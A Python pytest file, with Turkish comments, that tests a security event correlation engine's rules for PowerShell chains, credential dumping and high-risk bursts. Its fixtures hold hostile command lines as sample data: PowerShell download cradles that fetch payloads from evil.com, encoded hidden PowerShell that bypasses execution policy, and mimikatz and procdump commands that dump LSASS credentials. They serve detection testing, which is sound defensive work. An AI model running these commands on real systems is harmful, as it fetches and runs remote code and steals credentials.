"""
tests.test_correlation_engine
==============================
CorrelationGroup modeli, correlation rule'ları ve CorrelationEngine
için unit testler. DB erişimi yok — tamamen in-memory.
"""

import pytest
from pydantic import ValidationError

from app.models.normalized_event import NormalizedSecurityEvent
from app.services.correlation_engine.models import CorrelationGroup
from app.services.correlation_engine.rules import (
    CORRELATION_RULES,
    CorrelationRule,
    MatchResult,
    _match_powershell_chain,
    _match_credential_dumping,
    _match_high_risk_burst,
)
from app.services.correlation_engine.engine import CorrelationEngine


# ---------------------------------------------------------------------------
# Test Helper
# ---------------------------------------------------------------------------

def _make_event(**kwargs) -> NormalizedSecurityEvent:
    """Test event oluşturur. Varsayılan değerleri sağlar."""
    defaults = {
        "event_type": "process_execution",
        "tenant_id": "test-tenant",
        "hostname": "WORKSTATION-01",
        "username": "testuser",
        "risk_score": 50,
        "severity": "MEDIUM",
        "timestamp": "2026-01-15T10:00:00+00:00",
    }
    defaults.update(kwargs)
    return NormalizedSecurityEvent(**defaults)


# ---------------------------------------------------------------------------
# CorrelationGroup Model Testleri
# ---------------------------------------------------------------------------

class TestCorrelationGroupModel:

    def test_valid_group_creation(self):
        group = CorrelationGroup(
            tenant_id="t-123",
            title="Test Group",
            description="Test description",
            severity="HIGH",
            confidence="high",
            risk_score=85,
            reason="Test reason",
        )
        assert group.title == "Test Group"
        assert group.severity == "HIGH"
        assert group.confidence == "high"
        assert group.risk_score == 85
        assert group.status == "open"
        assert group.id  # UUID auto-generated
        assert group.created_at  # timestamp auto-generated

    def test_minimal_group_creation(self):
        group = CorrelationGroup()
        assert group.title == ""
        assert group.severity == "INFO"
        assert group.confidence == "medium"
        assert group.risk_score == 0
        assert group.event_ids == []
        assert group.entities == {"hostnames": [], "usernames": [], "ips": []}

    def test_id_auto_generated_unique(self):
        g1 = CorrelationGroup()
        g2 = CorrelationGroup()
        assert g1.id != g2.id

    def test_risk_score_clamped_high(self):
        group = CorrelationGroup(risk_score=150)
        assert group.risk_score == 100

    def test_risk_score_clamped_low(self):
        group = CorrelationGroup(risk_score=-10)
        assert group.risk_score == 0

    def test_invalid_severity_rejected(self):
        with pytest.raises(ValidationError, match="severity"):
            CorrelationGroup(severity="UNKNOWN")

    def test_invalid_confidence_rejected(self):
        with pytest.raises(ValidationError, match="confidence"):
            CorrelationGroup(confidence="super_high")

    def test_severity_case_insensitive(self):
        group = CorrelationGroup(severity="critical")
        assert group.severity == "CRITICAL"

    def test_confidence_case_insensitive(self):
        group = CorrelationGroup(confidence="HIGH")
        assert group.confidence == "high"

    def test_add_event_collects_ids(self):
        group = CorrelationGroup()
        ev = _make_event(raw_ref_id="alert-1")
        group.add_event(ev)
        assert ev.id in group.event_ids
        assert "alert-1" in group.alert_ids

    def test_add_event_collects_entities(self):
        group = CorrelationGroup()
        ev = _make_event(
            hostname="SRV-01",
            username="admin",
            source_ip="10.0.0.1",
        )
        group.add_event(ev)
        assert "SRV-01" in group.entities["hostnames"]
        assert "admin" in group.entities["usernames"]
        assert "10.0.0.1" in group.entities["ips"]

    def test_add_event_collects_mitre(self):
        group = CorrelationGroup()
        ev = _make_event(
            mitre_tactic="Execution",
            mitre_technique="T1059.001",
        )
        group.add_event(ev)
        assert "Execution" in group.tactics
        assert "T1059.001" in group.techniques

    def test_add_event_no_duplicates(self):
        group = CorrelationGroup()
        ev = _make_event(hostname="SRV-01")
        group.add_event(ev)
        group.add_event(ev)  # aynı event tekrar
        assert len(group.event_ids) == 1
        assert len(group.entities["hostnames"]) == 1

    def test_to_dict_returns_complete_data(self):
        group = CorrelationGroup(
            title="Test",
            severity="HIGH",
            risk_score=75,
        )
        d = group.to_dict()
        assert isinstance(d, dict)
        assert d["title"] == "Test"
        assert d["severity"] == "HIGH"
        assert d["risk_score"] == 75
        assert "id" in d
        assert "entities" in d


# ---------------------------------------------------------------------------
# PowerShell Chain Rule Testleri
# ---------------------------------------------------------------------------

class TestPowerShellChainRule:

    def test_match_evasion_chain(self):
        """İki event'te PowerShell + evasion → eşleşmeli."""
        events = [
            _make_event(
                command_line="powershell -nop -w hidden -enc abc123",
                process_name="powershell.exe",
            ),
            _make_event(
                command_line="powershell -ep bypass -noprofile Get-Process",
                process_name="powershell.exe",
            ),
        ]
        result = _match_powershell_chain(events)
        assert result is not None
        assert len(result.matched_events) == 2
        assert "evasion" in result.reason

    def test_match_download_chain(self):
        """İki event'te PowerShell + download cradle → eşleşmeli."""
        events = [
            _make_event(
                command_line="powershell IEX(New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1')",
                process_name="powershell.exe",
            ),
            _make_event(
                command_line="powershell Invoke-WebRequest http://evil.com/payload -OutFile c:\\temp\\p.exe",
                process_name="powershell.exe",
            ),
        ]
        result = _match_powershell_chain(events)
        assert result is not None
        assert len(result.matched_events) == 2

    def test_no_match_single_event(self):
        """Tek event yeterli değil."""
        events = [
            _make_event(
                command_line="powershell -nop -enc abc123",
                process_name="powershell.exe",
            ),
        ]
        result = _match_powershell_chain(events)
        assert result is None

    def test_no_match_benign_powershell(self):
        """Evasion/download olmayan normal PowerShell → eşleşmemeli."""
        events = [
            _make_event(
                command_line="powershell Get-Date",
                process_name="powershell.exe",
            ),
            _make_event(
                command_line="powershell Get-Process",
                process_name="powershell.exe",
            ),
        ]
        result = _match_powershell_chain(events)
        assert result is None

    def test_no_match_different_hosts(self):
        """Farklı hostlardaki event'ler → eşleşmemeli."""
        events = [
            _make_event(
                hostname="HOST-A",
                command_line="powershell -nop -enc abc123",
                process_name="powershell.exe",
            ),
            _make_event(
                hostname="HOST-B",
                command_line="powershell -nop -w hidden cmd",
                process_name="powershell.exe",
            ),
        ]
        result = _match_powershell_chain(events)
        assert result is None


# ---------------------------------------------------------------------------
# Credential Dumping Chain Rule Testleri
# ---------------------------------------------------------------------------

class TestCredentialDumpingRule:

    def test_match_mimikatz_chain(self):
        """Mimikatz + sekurlsa → eşleşmeli."""
        events = [
            _make_event(
                command_line="mimikatz.exe privilege::debug",
                process_name="mimikatz.exe",
            ),
            _make_event(
                command_line="mimikatz.exe sekurlsa::logonpasswords",
                process_name="mimikatz.exe",
            ),
        ]
        result = _match_credential_dumping(events)
        assert result is not None
        assert len(result.matched_events) == 2

    def test_match_lsass_procdump(self):
        """lsass + procdump → eşleşmeli."""
        events = [
            _make_event(
                command_line="procdump -ma lsass.exe lsass.dmp",
                attributes={"details": "Process dump of lsass"},
            ),
            _make_event(
                command_line="mimikatz.exe",
                mitre_technique="T1003.001",
            ),
        ]
        result = _match_credential_dumping(events)
        assert result is not None

    def test_match_mitre_t1003(self):
        """T1003 technique → keyword olmadan da eşleşmeli."""
        events = [
            _make_event(mitre_technique="T1003"),
            _make_event(mitre_technique="T1003.001"),
        ]
        result = _match_credential_dumping(events)
        assert result is not None
        assert len(result.matched_events) == 2

    def test_no_match_single_event(self):
        """Tek credential event yeterli değil."""
        events = [
            _make_event(command_line="mimikatz.exe"),
        ]
        result = _match_credential_dumping(events)
        assert result is None

    def test_no_match_irrelevant_events(self):
        """İlgisiz event'ler → eşleşmemeli."""
        events = [
            _make_event(command_line="notepad.exe readme.txt"),
            _make_event(command_line="calc.exe"),
        ]
        result = _match_credential_dumping(events)
        assert result is None


# ---------------------------------------------------------------------------
# High Risk Burst Rule Testleri
# ---------------------------------------------------------------------------

class TestHighRiskBurstRule:

    def test_match_burst(self):
        """3 yüksek riskli event 5 dk içinde → eşleşmeli."""
        events = [
            _make_event(
                risk_score=80,
                timestamp="2026-01-15T10:00:00+00:00",
            ),
            _make_event(
                risk_score=70,
                timestamp="2026-01-15T10:01:00+00:00",
            ),
            _make_event(
                risk_score=90,
                timestamp="2026-01-15T10:02:00+00:00",
            ),
        ]
        result = _match_high_risk_burst(events)
        assert result is not None
        assert len(result.matched_events) == 3

    def test_no_match_low_risk(self):
        """Düşük risk → eşleşmemeli (avg < 60)."""
        events = [
            _make_event(risk_score=20, timestamp="2026-01-15T10:00:00+00:00"),
            _make_event(risk_score=30, timestamp="2026-01-15T10:01:00+00:00"),
            _make_event(risk_score=25, timestamp="2026-01-15T10:02:00+00:00"),
        ]
        result = _match_high_risk_burst(events)
        assert result is None

    def test_no_match_outside_window(self):
        """5 dk dışı → eşleşmemeli."""
        events = [
            _make_event(risk_score=80, timestamp="2026-01-15T10:00:00+00:00"),
            _make_event(risk_score=80, timestamp="2026-01-15T10:10:00+00:00"),
            _make_event(risk_score=80, timestamp="2026-01-15T10:20:00+00:00"),
        ]
        result = _match_high_risk_burst(events)
        assert result is None

    def test_no_match_insufficient_events(self):
        """2 event yeterli değil (min 3)."""
        events = [
            _make_event(risk_score=90, timestamp="2026-01-15T10:00:00+00:00"),
            _make_event(risk_score=90, timestamp="2026-01-15T10:01:00+00:00"),
        ]
        result = _match_high_risk_burst(events)
        assert result is None

    def test_match_partial_window(self):
        """5 event'ten 3'ü pencere içinde → eşleşmeli."""
        events = [
            _make_event(risk_score=80, timestamp="2026-01-15T10:00:00+00:00"),
            _make_event(risk_score=70, timestamp="2026-01-15T10:01:00+00:00"),
            _make_event(risk_score=75, timestamp="2026-01-15T10:02:00+00:00"),
            _make_event(risk_score=20, timestamp="2026-01-15T10:30:00+00:00"),
            _make_event(risk_score=20, timestamp="2026-01-15T10:40:00+00:00"),
        ]
        result = _match_high_risk_burst(events)
        assert result is not None
        assert len(result.matched_events) == 3


# ---------------------------------------------------------------------------
# CorrelationEngine Testleri
# ---------------------------------------------------------------------------

class TestCorrelationEngine:

    def setup_method(self):
        self.engine = CorrelationEngine()

    def test_empty_input(self):
        """Boş event listesi → boş sonuç."""
        groups = self.engine.correlate([])
        assert groups == []

    def test_no_match(self):
        """İlgisiz event'ler → boş sonuç."""
        events = [
            _make_event(command_line="notepad.exe readme.txt"),
            _make_event(command_line="calc.exe"),
        ]
        groups = self.engine.correlate(events)
        assert groups == []

    def test_powershell_chain_produces_group(self):
        """PowerShell chain → CorrelationGroup üretilmeli."""
        events = [
            _make_event(
                command_line="powershell -nop -enc abc123",
                process_name="powershell.exe",
                risk_score=70,
            ),
            _make_event(
                command_line="powershell -w hidden IEX(downloadstring('http://evil'))",
                process_name="powershell.exe",
                risk_score=80,
            ),
        ]
        groups = self.engine.correlate(events)
        assert len(groups) >= 1
        ps_group = next(g for g in groups if g.title == "Suspicious PowerShell Chain")
        assert ps_group.severity in ("HIGH", "CRITICAL")
        assert ps_group.risk_score > 0
        assert len(ps_group.event_ids) == 2

    def test_credential_chain_produces_group(self):
        """Credential chain → CorrelationGroup üretilmeli."""
        events = [
            _make_event(
                command_line="mimikatz.exe privilege::debug",
                risk_score=90,
                mitre_tactic="Credential Access",
                mitre_technique="T1003",
            ),
            _make_event(
                command_line="mimikatz.exe sekurlsa::logonpasswords",
                risk_score=95,
                mitre_tactic="Credential Access",
                mitre_technique="T1003",
            ),
        ]
        groups = self.engine.correlate(events)
        assert len(groups) >= 1
        cred_group = next(g for g in groups if g.title == "Credential Dumping Chain")
        assert cred_group.severity == "CRITICAL"
        assert cred_group.confidence == "high"
        assert "Credential Access" in cred_group.tactics

    def test_tenant_isolation(self):
        """Farklı tenant'ların event'leri karışmamalı."""
        events = [
            _make_event(
                tenant_id="tenant-A",
                hostname="HOST-1",
                command_line="powershell -nop -enc abc",
                process_name="powershell.exe",
            ),
            _make_event(
                tenant_id="tenant-B",
                hostname="HOST-1",
                command_line="powershell -w hidden IEX(downloadstring('x'))",
                process_name="powershell.exe",
            ),
        ]
        groups = self.engine.correlate(events)
        # Her tenant'ta tek event — eşleşme olmamalı
        ps_groups = [g for g in groups if g.title == "Suspicious PowerShell Chain"]
        assert len(ps_groups) == 0

    def test_multiple_rules_can_match(self):
        """Birden fazla rule aynı anda eşleşebilmeli."""
        events = [
            # PowerShell chain
            _make_event(
                command_line="powershell -nop -enc abc123",
                process_name="powershell.exe",
                risk_score=70,
                timestamp="2026-01-15T10:00:00+00:00",
            ),
            _make_event(
                command_line="powershell -w hidden downloadstring('http://x')",
                process_name="powershell.exe",
                risk_score=80,
                timestamp="2026-01-15T10:01:00+00:00",
            ),
            # Credential chain
            _make_event(
                command_line="mimikatz.exe privilege::debug",
                risk_score=90,
                timestamp="2026-01-15T10:02:00+00:00",
            ),
            _make_event(
                command_line="mimikatz.exe sekurlsa::logonpasswords",
                risk_score=95,
                timestamp="2026-01-15T10:03:00+00:00",
            ),
        ]
        groups = self.engine.correlate(events)
        titles = {g.title for g in groups}
        assert "Suspicious PowerShell Chain" in titles
        assert "Credential Dumping Chain" in titles

    def test_custom_rules(self):
        """Custom rule seti ile engine çalışmalı."""
        def always_match(events):
            if len(events) >= 1:
                return MatchResult(
                    matched_events=events[:1],
                    reason="Always matches",
                )
            return None

        custom_rule = CorrelationRule(
            name="test_rule",
            title="Test Rule",
            description="Test",
            severity="LOW",
            confidence="low",
            match=always_match,
        )
        engine = CorrelationEngine(rules=[custom_rule])
        events = [_make_event()]
        groups = engine.correlate(events)
        assert len(groups) == 1
        assert groups[0].title == "Test Rule"


# ---------------------------------------------------------------------------
# Risk Aggregation Testleri
# ---------------------------------------------------------------------------

class TestRiskAggregation:

    def setup_method(self):
        self.engine = CorrelationEngine()

    def test_base_is_max_risk(self):
        """Base risk en yüksek event risk'i olmalı."""
        events = [
            _make_event(risk_score=60),
            _make_event(risk_score=80),
        ]
        rule = CORRELATION_RULES[0]  # herhangi bir rule
        risk = CorrelationEngine._aggregate_risk(events, rule)
        assert risk >= 80  # base en az 80

    def test_sequence_bonus_applied(self):
        """Daha fazla event → daha yüksek risk (sequence bonus)."""
        events_2 = [_make_event(risk_score=50) for _ in range(2)]
        events_5 = [_make_event(risk_score=50) for _ in range(5)]
        rule = CORRELATION_RULES[0]
        risk_2 = CorrelationEngine._aggregate_risk(events_2, rule)
        risk_5 = CorrelationEngine._aggregate_risk(events_5, rule)
        assert risk_5 > risk_2

    def test_critical_keyword_bonus(self):
        """Critical keyword varsa bonus eklenmeli."""
        events_without = [
            _make_event(command_line="notepad.exe", risk_score=50),
            _make_event(command_line="calc.exe", risk_score=50),
        ]
        events_with = [
            _make_event(command_line="mimikatz.exe", risk_score=50),
            _make_event(command_line="lsass dump", risk_score=50),
        ]
        rule = CORRELATION_RULES[0]
        risk_without = CorrelationEngine._aggregate_risk(events_without, rule)
        risk_with = CorrelationEngine._aggregate_risk(events_with, rule)
        assert risk_with > risk_without

    def test_risk_clamped_at_100(self):
        """Risk 100'ü aşmamalı."""
        events = [
            _make_event(
                risk_score=95,
                command_line="mimikatz.exe",
                mitre_tactic="Credential Access",
                hostname="HOST-A",
                username="admin",
                source_ip="10.0.0.1",
            )
            for _ in range(10)
        ]
        rule = CORRELATION_RULES[0]
        risk = CorrelationEngine._aggregate_risk(events, rule)
        assert risk <= 100

    def test_empty_events_returns_zero(self):
        """Boş event listesi → risk 0."""
        rule = CORRELATION_RULES[0]
        risk = CorrelationEngine._aggregate_risk([], rule)
        assert risk == 0


# ---------------------------------------------------------------------------
# Severity Adjustment Testleri
# ---------------------------------------------------------------------------

class TestSeverityAdjustment:

    def test_severity_escalated_by_risk(self):
        """Yüksek risk → severity yükseltilmeli."""
        result = CorrelationEngine._adjust_severity("LOW", 95)
        assert result == "CRITICAL"

    def test_severity_never_downgraded(self):
        """Mevcut severity düşürülmemeli."""
        result = CorrelationEngine._adjust_severity("CRITICAL", 10)
        assert result == "CRITICAL"

    def test_severity_kept_when_equal(self):
        """Risk ile aynı seviyedeyse değişmemeli."""
        result = CorrelationEngine._adjust_severity("HIGH", 75)
        assert result == "HIGH"
